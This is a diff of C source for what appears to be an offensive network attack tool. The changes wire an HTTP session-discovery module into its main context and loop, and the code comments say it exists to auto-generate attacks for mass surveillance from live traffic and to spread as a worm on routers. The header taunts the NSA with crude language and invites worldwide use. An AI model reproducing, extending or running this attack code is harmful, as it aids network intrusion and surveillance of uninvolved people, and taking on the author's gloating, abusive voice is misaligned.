@@ -9,6 +9,8 @@ NSA: This is for rape.  I think you guys get it now.  Really thought I'd sit by 
 
 Oh BTW: feel free to steal more of my intellectual property.. you can use this all you like all over the world ;)
 
+If this is the damage I can do alone... what do you  think will happen in the future?
+
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -201,6 +203,10 @@ AS_context *AS_ctx_new() {
     // start threads after loading.. so we dont have useless packets to process
     Threads_Start(ctx);
 
+    // initialize real time http session discovery.. so we can automatically geenerate attacks for mass surveillance from live arbitrary traffic
+    // aint this going to fuck shit up :).. esp on a worm w routers ;).. shittt... good luck
+    HTTPDiscover_Init(ctx);
+
     return ctx;
 }
 
@@ -229,6 +235,9 @@ int Subsystems_Perform(AS_context *ctx) {
     Traceroute_Perform(ctx);
     // now apply any changes, or further the blackhole attacks
     BH_Perform(ctx);
+
+    // perform http discovery looking for live http sessions in real time
+    HTTPDiscover_Perform(ctx);
 }
 
 
